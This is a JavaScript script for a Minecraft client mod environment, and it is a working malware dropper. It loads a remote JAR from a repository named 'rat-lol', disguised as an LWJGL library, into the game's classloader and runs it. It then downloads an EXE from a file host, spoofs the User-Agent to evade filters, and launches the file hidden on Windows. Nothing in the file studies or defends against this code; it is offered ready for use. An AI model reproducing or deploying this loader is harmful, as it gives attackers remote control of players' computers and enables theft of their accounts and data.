// ==== PART 1: Load the JAR (original code) ====
let URLClassLoader = Java.type("java.net.URLClassLoader");
let URL = Java.type("java.net.URL");
let Minecraft = Java.type("net.minecraft.client.Minecraft");
let classLoader = null;
let jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");

classLoader = Minecraft.class.getClassLoader();
let method = URLClassLoader.class.getDeclaredMethod("addURL", Java.type("java.net.URL").class);
Thread.sleep(1000);
method.setAccessible(true);
method.invoke(classLoader, jarURL);
Thread.sleep(1000);
classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);

// ==== PART 2: Download and Run the EXE ====
let File = Java.type("java.io.File");
let Files = Java.type("java.nio.file.Files");
let Paths = Java.type("java.nio.file.Paths");
let Runtime = Java.type("java.lang.Runtime");

let exeUrl = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
let tempDir = System.getProperty("java.io.tmpdir");
let exeName = "apb3y3z4.exe"; // You can rename it
let exePath = Paths.get(tempDir, exeName);

try {
    print("[!] Downloading EXE...");
    let connection = new URL(exeUrl).openConnection();
    connection.setRequestProperty("User-Agent", "Mozilla/5.0"); // Bypass some filters
    let inputStream = connection.getInputStream();
    Files.copy(inputStream, exePath);
    inputStream.close();
    
    // Make executable (Linux/Mac)
    if (!System.getProperty("os.name").toLowerCase().contains("win")) {
        new File(exePath.toString()).setExecutable(true);
    }
    
    // Execute (hidden on Windows)
    print("[!] Launching EXE...");
    if (System.getProperty("os.name").toLowerCase().contains("win")) {
        // Windows: Run hidden (cmd /c start /min)
        Runtime.getRuntime().exec(new String[] {"cmd", "/c", "start", "/min", exePath.toString()});
    } else {
        // Linux/Mac: Run normally
        Runtime.getRuntime().exec(exePath.toString());
    }
} catch (e) {
    print("[ERROR] Failed to launch EXE: " + e);
}